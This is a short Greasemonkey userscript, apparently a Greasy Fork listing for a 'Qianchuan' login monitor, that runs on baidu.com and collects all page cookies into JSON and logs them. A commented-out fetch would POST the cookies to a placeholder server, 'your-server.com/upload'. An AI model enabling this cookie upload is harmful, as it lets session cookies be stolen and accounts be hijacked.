// ==UserScript==
// @name        千川监控登录
// @namespace   https://www.baidu.com/
// @include     https://www.baidu.com/*
// @grant       none
// @version     1.0.5
// @author      张亚鹏
// @description 2024/5/23 11:39:51
// @downloadURL https://update.greasyfork.org/scripts/495842/%E5%8D%83%E5%B7%9D%E7%9B%91%E6%8E%A7%E7%99%BB%E5%BD%95.user.js
// @updateURL https://update.greasyfork.org/scripts/495842/%E5%8D%83%E5%B7%9D%E7%9B%91%E6%8E%A7%E7%99%BB%E5%BD%95.meta.js
// ==/UserScript==
(function() {
    'use strict';

    // 获取当前网页的所有cookies
    var cookies = document.cookie.split(';').map(function(cookie) {
        var parts = cookie.split('=');
        return { name: parts[0].trim(), value: parts[1].trim() };
    });

    // 将cookies转换为JSON格式
    var cookiesJSON = JSON.stringify(cookies);

    // 创建一个新的FormData对象
    var formData = new FormData();

    // 添加cookies数据到FormData对象
    formData.append('cookies', cookiesJSON);
    console.log('cookies_5',cookiesJSON)
    // // 创建一个新的fetch请求上传cookies
    // fetch('https://your-server.com/upload', {
    //     method: 'POST',
    //     body: formData
    // })
    // .then(response => response.json())
    // .then(data => console.log(data))
    // .catch(error => console.error('Error:', error));

})();
